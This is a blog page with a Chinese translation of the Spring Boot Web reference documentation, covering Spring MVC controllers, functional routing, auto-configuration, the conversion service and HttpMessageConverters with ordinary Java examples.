<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Spring Boot Web中文文档 - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Spring Boot Web中文文档" />
<meta property="og:description" content="本文为官方文档直译版本。原文链接
Spring Boot Web中文文档 引言Servlet Web ApplicationsSpring Web MVC FrameworkSpring MVC 自动配置Spring MVC 转换服务HttpMessageConvertersMessageCodesResolver静态内容欢迎页面自定义图标路径匹配和内容协商ConfigurableWebBindingInitializer模板引擎错误处理自定义错误页面在 Spring MVC 之外映射错误页面WAR 部署中的错误处理 CORS 支持 JAX-RS 和 Jersey嵌入式 Servlet 容器支持Servlets, Filters, 和 Listeners将 Servlet、Filters和Listeners注册为 Spring Bean 初始化 Servlet 上下文扫描Servlets, Filters, 和 listeners ServletWebServerApplicationContext自定义嵌入式 Servlet 容器SameSite Cookie字符编码程序自定义直接自定义 ConfigurableServletWebServerFactory JSP 的局限 Reactive Web ApplicationsSpring WebFlux FrameworkSpring WebFlux 自动配置Spring WebFlux 转换服务带有 HttpMessageReaders 和 HttpMessageWriters 的 HTTP 编解码器静态内容欢迎页面模板引擎错误处理自定义错误页面 Web Filters 嵌入式反应式服务器支持自定义反应式服务器程序自定义直接自定义 ConfigurableReactiveWebServerFactory 反应式服务器资源配置 优雅关机Spring SecurityMVC SecurityWebFlux SecurityOAuth2Client通用提供商的 OAuth2 客户端注册 资源服务器认证服务器 SAML 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/1fcd299ebeb5127c7caea20b3b5ce0ec/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-21T12:29:27+08:00" />
<meta property="article:modified_time" content="2023-12-21T12:29:27+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Spring Boot Web中文文档</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <blockquote> 
 <p>本文为官方文档直译版本。<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/web.html#web" rel="nofollow">原文链接</a></p> 
</blockquote> 
<p></p> 
<div class="toc"> 
 <h4>Spring Boot Web中文文档</h4> 
 <ul><li><ul><li><a href="#_4" rel="nofollow">引言</a></li><li><a href="#Servlet_Web_Applications_7" rel="nofollow">Servlet Web Applications</a></li><li><ul><li><a href="#Spring_Web_MVC_Framework_9" rel="nofollow">Spring Web MVC Framework</a></li><li><ul><li><a href="#Spring_MVC__107" rel="nofollow">Spring MVC 自动配置</a></li><li><a href="#Spring_MVC__120" rel="nofollow">Spring MVC 转换服务</a></li><li><a href="#HttpMessageConverters_131" rel="nofollow">HttpMessageConverters</a></li><li><a href="#MessageCodesResolver_153" rel="nofollow">MessageCodesResolver</a></li><li><a href="#_155" rel="nofollow">静态内容</a></li><li><a href="#_204" rel="nofollow">欢迎页面</a></li><li><a href="#_213" rel="nofollow">自定义图标</a></li><li><a href="#_215" rel="nofollow">路径匹配和内容协商</a></li><li><a href="#ConfigurableWebBindingInitializer_250" rel="nofollow">ConfigurableWebBindingInitializer</a></li><li><a href="#_252" rel="nofollow">模板引擎</a></li><li><a href="#_265" rel="nofollow">错误处理</a></li><li><ul><li><a href="#_332" rel="nofollow">自定义错误页面</a></li><li><a href="#_Spring_MVC__383" rel="nofollow">在 Spring MVC 之外映射错误页面</a></li><li><a href="#WAR__432" rel="nofollow">WAR 部署中的错误处理</a></li></ul> 
     </li><li><a href="#CORS__435" rel="nofollow">CORS 支持</a></li></ul> 
    </li><li><a href="#JAXRS__Jersey_461" rel="nofollow">JAX-RS 和 Jersey</a></li><li><a href="#_Servlet__501" rel="nofollow">嵌入式 Servlet 容器支持</a></li><li><ul><li><a href="#Servlets_Filters__Listeners_503" rel="nofollow">Servlets, Filters, 和 Listeners</a></li><li><ul><li><a href="#_ServletFiltersListeners_Spring_Bean_505" rel="nofollow">将 Servlet、Filters和Listeners注册为 Spring Bean</a></li></ul> 
     </li><li><a href="#_Servlet__514" rel="nofollow">初始化 Servlet 上下文</a></li><li><ul><li><a href="#Servlets_Filters__listeners_517" rel="nofollow">扫描Servlets, Filters, 和 listeners</a></li></ul> 
     </li><li><a href="#ServletWebServerApplicationContext_521" rel="nofollow">ServletWebServerApplicationContext</a></li><li><a href="#_Servlet__546" rel="nofollow">自定义嵌入式 Servlet 容器</a></li><li><ul><li><a href="#SameSite_Cookie_559" rel="nofollow">SameSite Cookie</a></li><li><a href="#_587" rel="nofollow">字符编码</a></li><li><a href="#_598" rel="nofollow">程序自定义</a></li><li><a href="#_ConfigurableServletWebServerFactory_635" rel="nofollow">直接自定义 ConfigurableServletWebServerFactory</a></li></ul> 
     </li><li><a href="#JSP__640" rel="nofollow">JSP 的局限</a></li></ul> 
   </li></ul> 
   </li><li><a href="#Reactive_Web_Applications_646" rel="nofollow">Reactive Web Applications</a></li><li><ul><li><a href="#Spring_WebFlux_Framework_648" rel="nofollow">Spring WebFlux Framework</a></li><li><ul><li><a href="#Spring_WebFlux__750" rel="nofollow">Spring WebFlux 自动配置</a></li><li><a href="#Spring_WebFlux__759" rel="nofollow">Spring WebFlux 转换服务</a></li><li><a href="#_HttpMessageReaders__HttpMessageWriters__HTTP__769" rel="nofollow">带有 HttpMessageReaders 和 HttpMessageWriters 的 HTTP 编解码器</a></li><li><a href="#_794" rel="nofollow">静态内容</a></li><li><a href="#_806" rel="nofollow">欢迎页面</a></li><li><a href="#_815" rel="nofollow">模板引擎</a></li><li><a href="#_824" rel="nofollow">错误处理</a></li><li><ul><li><a href="#_910" rel="nofollow">自定义错误页面</a></li></ul> 
     </li><li><a href="#Web_Filters_936" rel="nofollow">Web Filters</a></li></ul> 
    </li><li><a href="#_945" rel="nofollow">嵌入式反应式服务器支持</a></li><li><ul><li><a href="#_947" rel="nofollow">自定义反应式服务器</a></li><li><ul><li><a href="#_959" rel="nofollow">程序自定义</a></li><li><a href="#_ConfigurableReactiveWebServerFactory_994" rel="nofollow">直接自定义 ConfigurableReactiveWebServerFactory</a></li></ul> 
    </li></ul> 
    </li><li><a href="#_999" rel="nofollow">反应式服务器资源配置</a></li></ul> 
   </li><li><a href="#_1008" rel="nofollow">优雅关机</a></li><li><a href="#Spring_Security_1024" rel="nofollow">Spring Security</a></li><li><ul><li><a href="#MVC_Security_1041" rel="nofollow">MVC Security</a></li><li><a href="#WebFlux_Security_1052" rel="nofollow">WebFlux Security</a></li><li><a href="#OAuth2_1088" rel="nofollow">OAuth2</a></li><li><ul><li><a href="#Client_1090" rel="nofollow">Client</a></li><li><ul><li><a href="#_OAuth2__1178" rel="nofollow">通用提供商的 OAuth2 客户端注册</a></li></ul> 
     </li><li><a href="#_1196" rel="nofollow">资源服务器</a></li><li><a href="#_1239" rel="nofollow">认证服务器</a></li></ul> 
    </li><li><a href="#SAML_20_1294" rel="nofollow">SAML 2.0</a></li><li><ul><li><a href="#_1295" rel="nofollow">依赖方</a></li></ul> 
   </li></ul> 
   </li><li><a href="#Spring_Session_1367" rel="nofollow">Spring Session</a></li><li><a href="#Spring_for_GraphQL_1406" rel="nofollow">Spring for GraphQL</a></li><li><ul><li><a href="#GraphQL_Schema_1416" rel="nofollow">GraphQL Schema</a></li><li><a href="#GraphQL_RuntimeWiring_1454" rel="nofollow">GraphQL RuntimeWiring</a></li><li><a href="#_Querydsl__QueryByExample__1472" rel="nofollow">支持 Querydsl 和 QueryByExample 资源库</a></li><li><a href="#_1482" rel="nofollow">传输方式</a></li><li><ul><li><a href="#HTTP__WebSocket_1483" rel="nofollow">HTTP 和 WebSocket</a></li></ul> 
    </li><li><a href="#RSocket_1504" rel="nofollow">RSocket</a></li><li><a href="#_1523" rel="nofollow">异常处理</a></li><li><a href="#GraphiQL__Schema__1525" rel="nofollow">GraphiQL 和 Schema 打印</a></li></ul> 
   </li><li><a href="#Spring_HATEOAS_1529" rel="nofollow">Spring HATEOAS</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="_4"></a>引言</h3> 
<p>Spring Boot 非常适合网络应用程序开发。您可以使用嵌入式 Tomcat、Jetty、Undertow 或 Netty 创建一个独立的 HTTP 服务器。大多数网络应用程序都使用 <code>spring-boot-starter-web</code> 模块来快速启动和运行。你也可以选择使用 <code>spring-boot-starter-webflux</code> 模块来构建反应式网络应用程序。<br> 如果尚未开发 Spring Boot Web 应用程序，可以按照入门部分中的 "Hello World!"示例进行开发。</p> 
<h3><a id="Servlet_Web_Applications_7"></a>Servlet Web Applications</h3> 
<p>如果想构建基于 servlet 的网络应用程序，可以利用 Spring Boot 为 Spring MVC 或 Jersey 提供的自动配置功能。</p> 
<h4><a id="Spring_Web_MVC_Framework_9"></a>Spring Web MVC Framework</h4> 
<p><a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc.html" rel="nofollow">Spring Web MVC Framework</a>（通常称为 “Spring MVC”）是一个丰富的 “模型、视图、控制器” Web 框架。Spring MVC 可让您创建特殊的 <code>@Controller</code> 或 <code>@RestController</code> Bean 来处理传入的 HTTP 请求。控制器中的方法通过 <code>@RequestMapping</code> 注解映射到 HTTP。<br> 下面的代码展示了一个典型的 <code>@RestController</code>，它提供 JSON 数据：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DeleteMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/users"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRestController</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">UserRepository</span> userRepository<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">CustomerRepository</span> customerRepository<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MyRestController</span><span class="token punctuation">(</span><span class="token class-name">UserRepository</span> userRepository<span class="token punctuation">,</span> <span class="token class-name">CustomerRepository</span> customerRepository<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository <span class="token operator">=</span> userRepository<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>customerRepository <span class="token operator">=</span> customerRepository<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/{userId}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/{userId}/customers"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Customer</span><span class="token punctuation">&gt;</span></span> <span class="token function">getUserCustomers</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository<span class="token punctuation">.</span><span class="token function">findById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>customerRepository<span class="token operator">::</span><span class="token function">findByUser</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@DeleteMapping</span><span class="token punctuation">(</span><span class="token string">"/{userId}"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deleteUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Long</span> userId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>userRepository<span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>功能变体 “WebMvc.fn” 将路由配置与请求的实际处理分离开来，如下例所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">MediaType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">RequestPredicate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">RouterFunction</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">RequestPredicates</span><span class="token punctuation">.</span><span class="token static">accept</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">RouterFunctions</span><span class="token punctuation">.</span><span class="token static">route</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRoutingConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">RequestPredicate</span> <span class="token constant">ACCEPT_JSON</span> <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_JSON</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">RouterFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ServerResponse</span><span class="token punctuation">&gt;</span></span> <span class="token function">routerFunction</span><span class="token punctuation">(</span><span class="token class-name">MyUserHandler</span> userHandler<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/{user}"</span><span class="token punctuation">,</span> <span class="token constant">ACCEPT_JSON</span><span class="token punctuation">,</span> userHandler<span class="token operator">::</span><span class="token function">getUser</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/{user}/customers"</span><span class="token punctuation">,</span> <span class="token constant">ACCEPT_JSON</span><span class="token punctuation">,</span> userHandler<span class="token operator">::</span><span class="token function">getUserCustomers</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">DELETE</span><span class="token punctuation">(</span><span class="token string">"/{user}"</span><span class="token punctuation">,</span> <span class="token constant">ACCEPT_JSON</span><span class="token punctuation">,</span> userHandler<span class="token operator">::</span><span class="token function">deleteUser</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">ServerRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">ServerResponse</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyUserHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">public</span> <span class="token class-name">ServerResponse</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">return</span> <span class="token class-name">ServerResponse</span><span class="token punctuation">.</span><span class="token function">ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">ServerResponse</span> <span class="token function">getUserCustomers</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">return</span> <span class="token class-name">ServerResponse</span><span class="token punctuation">.</span><span class="token function">ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">ServerResponse</span> <span class="token function">deleteUser</span><span class="token punctuation">(</span><span class="token class-name">ServerRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token keyword">return</span> <span class="token class-name">ServerResponse</span><span class="token punctuation">.</span><span class="token function">ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>Spring MVC 是 Spring 框架核心的一部分，详细信息请参见<a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc.html" rel="nofollow">参考文档</a>。<a href="https://spring.io/guides" rel="nofollow">spring.io/guides</a> 网站上也有多份介绍 Spring MVC 的指南。</p> 
<blockquote> 
 <p>您可以定义任意数量的 <code>RouterFunction</code> Bean，以便将路由器的定义模块化。如果需要应用优先级，可以对Bean进行排序。</p> 
</blockquote> 
<h5><a id="Spring_MVC__107"></a>Spring MVC 自动配置</h5> 
<p>Spring Boot 为 Spring MVC 提供了自动配置功能，可与大多数应用程序配合使用。它取代了 <code>@EnableWebMvc</code> 的需要，但两者不能同时使用。除了 Spring MVC 的默认设置外，自动配置还提供以下功能：</p> 
<ul><li>包含 <code>ContentNegotiatingViewResolver</code> 和 <code>BeanNameViewResolver</code> Bean。</li><li>支持静态资源服务，包括对 WebJar 的支持（本文档稍后将介绍）。</li><li>自动注册 <code>Converter</code>、<code>GenericConverter</code> 和 <code>Formatter</code> Bean。</li><li>支持 <code>HttpMessageConverters</code>（本文档稍后将介绍）。</li><li>自动注册 <code>MessageCodesResolver</code>（本文档稍后将介绍）。</li><li>支持静态 <code>index.html</code>。</li><li>自动使用 <code>ConfigurableWebBindingInitializer</code> Bean（本文档稍后将介绍）。</li></ul> 
<p>如果你想保留这些 Spring Boot MVC 自定义，并进行更多 <a href="https://docs.spring.io/spring-framework/reference/6.1/web/webmvc.html" rel="nofollow">MVC 自定义</a>（拦截器、格式化器、视图控制器和其他功能），你可以添加自己的 <code>@Configuration</code> 类，其类型为 <code>WebMvcConfigurer</code>，但不包含 <code>@EnableWebMvc</code>。<br> 如果您想提供 <code>RequestMappingHandlerMapping</code>、<code>RequestMappingHandlerAdapter</code> 或 <code>ExceptionHandlerExceptionResolver</code> 的自定义实例，并仍然保留 Spring Boot MVC 的自定义功能，您可以声明一个 <code>WebMvcRegistrations</code> 类型的 Bean，并使用它来提供这些组件的自定义实例。自定义实例将由 Spring MVC 进一步初始化和配置。要参与后续处理，或在需要时覆盖后续处理，应使用 <code>WebMvcConfigurer</code>。</p> 
<h5><a id="Spring_MVC__120"></a>Spring MVC 转换服务</h5> 
<p>Spring MVC 使用不同的转换服务（<code>ConversionService</code>）来转换 <code>application.properties</code> 或 <code>application.yaml</code> 文件中的值。这意味着 Period、Duration 和 DataSize 转换器不可用，并且 <code>@DurationUnit</code> 和 <code>@DataSizeUnit</code> 注解将被忽略。<br> 如果想定制 Spring MVC 使用的 <code>ConversionService</code>，可以提供一个带有 <code>addFormatters</code> 方法的 <code>WebMvcConfigurer</code> Bean。通过该方法，你可以注册任何你喜欢的转换器，也可以委托使用 <code>ApplicationConversionService</code> 上可用的静态方法。<br> 也可使用 <code>spring.mvc.format.*</code> 配置属性自定义转换。未配置时，将使用以下默认值：</p> 
<table><thead><tr><th>属性</th><th><code>DateTimeFormatter</code></th></tr></thead><tbody><tr><td><code>spring.mvc.format.date</code></td><td><code>ofLocalizedDate(FormatStyle.SHORT)</code></td></tr><tr><td><code>spring.mvc.format.time</code></td><td><code>ofLocalizedTime(FormatStyle.SHORT)</code></td></tr><tr><td><code>spring.mvc.format.date-time</code></td><td><code>ofLocalizedDateTime(FormatStyle.SHORT)</code></td></tr></tbody></table> 
<h5><a id="HttpMessageConverters_131"></a>HttpMessageConverters</h5> 
<p>Spring MVC 使用 <code>HttpMessageConverter</code> 接口来转换 HTTP 请求和响应。开箱即包含合理的默认设置。例如，对象可自动转换为 JSON（通过使用 Jackson 库）或 XML（通过使用 Jackson XML 扩展（如果可用），或通过使用 JAXB（如果 Jackson XML 扩展不可用））。默认情况下，字符串以 <code>UTF-8</code> 编码。<br> 如果需要添加或自定义转换器，可以使用 Spring Boot 的 <code>HttpMessageConverters</code> 类，如下表所示：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpMessageConverters</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>converter<span class="token punctuation">.</span></span><span class="token class-name">HttpMessageConverter</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyHttpMessageConvertersConfiguration</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">HttpMessageConverters</span> <span class="token function">customConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">HttpMessageConverter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> additional <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdditionalHttpMessageConverter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HttpMessageConverter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> another <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnotherHttpMessageConverter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HttpMessageConverters</span><span class="token punctuation">(</span>additional<span class="token punctuation">,</span> another<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>上下文中存在的任何 <code>HttpMessageConverter</code> Bean 都会被添加到转换器列表中。您也可以用同样的方法覆盖默认转换器。</p> 
<h5><a id="MessageCodesResolver_153"></a>MessageCodesResolver</h5> 
